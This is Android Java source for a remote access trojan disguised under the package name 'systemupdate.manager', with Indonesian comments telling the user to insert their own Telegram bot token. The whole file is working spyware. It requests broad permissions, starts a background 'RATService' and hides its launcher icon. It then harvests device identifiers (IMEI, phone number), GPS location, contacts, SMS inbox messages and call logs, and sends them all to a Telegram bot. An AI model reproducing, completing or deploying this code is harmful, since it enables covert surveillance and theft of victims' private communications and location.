package com.systemupdate.manager;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public class MainActivity extends Activity {
    
    // ⚠️ GANTI INI DENGAN TOKEN BOT TELEGRAM KAMU
    private static final String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
    
    private static final int PERMISSION_REQUEST = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Request permissions
        requestAllPermissions();
        
        // Start background service
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Hide app icon
        hideAppIcon();
        
        // Collect and send data
        new Thread(() -> {
            try {
                Thread.sleep(5000); // Wait for permissions
                collectAndExfiltrate();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
        
        // Close activity
        finish();
    }

    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE
        };
        
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST);
    }

    private void hideAppIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void collectAndExfiltrate() {
        try {
            StringBuilder report = new StringBuilder();
            report.append("📱 RAT REPORT\n\n");
            report.append("═══════════════════\n");
            report.append(getDeviceInfo());
            report.append("\n═══════════════════\n");
            report.append(getLocation());
            report.append("\n═══════════════════\n");
            
            sendToTelegram(report.toString());
            
            // Send contacts separately (might be long)
            String contacts = getContacts();
            if (contacts.length() > 0) {
                sendToTelegram("📞 CONTACTS:\n\n" + contacts);
            }
            
            // Send SMS separately
            String sms = getSMS();
            if (sms.length() > 0) {
                sendToTelegram("💬 SMS:\n\n" + sms);
            }
            
            // Send call logs
            String callLogs = getCallLogs();
            if (callLogs.length() > 0) {
                sendToTelegram("📞 CALL LOGS:\n\n" + callLogs);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("📲 DEVICE INFO\n\n");
        info.append("Model: ").append(Build.MODEL).append("\n");
        info.append("Brand: ").append(Build.BRAND).append("\n");
        info.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
        info.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
        
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    info.append("IMEI: ").append(tm.getImei()).append("\n");
                }
                info.append("Phone Number: ").append(tm.getLine1Number()).append("\n");
            }
        } catch (Exception e) {
            info.append("Phone info: Permission denied\n");
        }
        
        return info.toString();
    }

    private String getLocation() {
        StringBuilder loc = new StringBuilder();
        loc.append("📍 LOCATION\n\n");
        
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (location != null) {
                    double lat = location.getLatitude();
                    double lon = location.getLongitude();
                    loc.append("Latitude: ").append(lat).append("\n");
                    loc.append("Longitude: ").append(lon).append("\n");
                    loc.append("Google Maps: https://maps.google.com/?q=").append(lat).append(",").append(lon).append("\n");
                } else {
                    loc.append("Location unavailable\n");
                }
            } else {
                loc.append("Location permission denied\n");
            }
        } catch (Exception e) {
            loc.append("Error: ").append(e.getMessage()).append("\n");
        }
        
        return loc.toString();
    }

    private String getContacts() {
        StringBuilder contacts = new StringBuilder();
        int count = 0;
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null
                );
                
                if (cursor != null) {
                    while (cursor.moveToNext() && count < 50) { // Limit to 50 contacts
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.append(name).append(": ").append(number).append("\n");
                        count++;
                    }
                    cursor.close();
                }
            }
        } catch (Exception e) {
            contacts.append("Error reading contacts: ").append(e.getMessage());
        }
        
        return contacts.toString();
    }

    private String getSMS() {
        StringBuilder sms = new StringBuilder();
        int count = 0;
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC"
                );
                
                if (cursor != null) {
                    while (cursor.moveToNext() && count < 20) { // Limit to 20 messages
                        String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                        String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                        sms.append("From: ").append(address).append("\n");
                        sms.append("Message: ").append(body).append("\n");
                        sms.append("---\n");
                        count++;
                    }
                    cursor.close();
                }
            }
        } catch (Exception e) {
            sms.append("Error reading SMS: ").append(e.getMessage());
        }
        
        return sms.toString();
    }

    private String getCallLogs() {
        StringBuilder logs = new StringBuilder();
        int count = 0;
        
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC"
                );
                
                if (cursor != null) {
                    while (cursor.moveToNext() && count < 20) { // Limit to 20 logs
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        
                        String callType = "";
                        switch (Integer.parseInt(type)) {
                            case CallLog.Calls.INCOMING_TYPE:
                                callType = "Incoming";
                                break;
                            case CallLog.Calls.OUTGOING_TYPE:
                                callType = "Outgoing";
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                callType = "Missed";
                                break;
                        }
                        
                        logs.append(number).append(" (").append(callType).append(") - ").append(duration).append("s\n");
                        count++;
                    }
                    cursor.close();
                }
            }
        } catch (Exception e) {
            logs.append("Error reading call logs: ").append(e.getMessage());
        }
        
        return logs.toString();
    }

    private void sendToTelegram(String message) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            JSONObject payload = new JSONObject();
            payload.put("chat_id", TELEGRAM_CHAT_ID);
            payload.put("text", message);
            payload.put("parse_mode", "HTML");

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
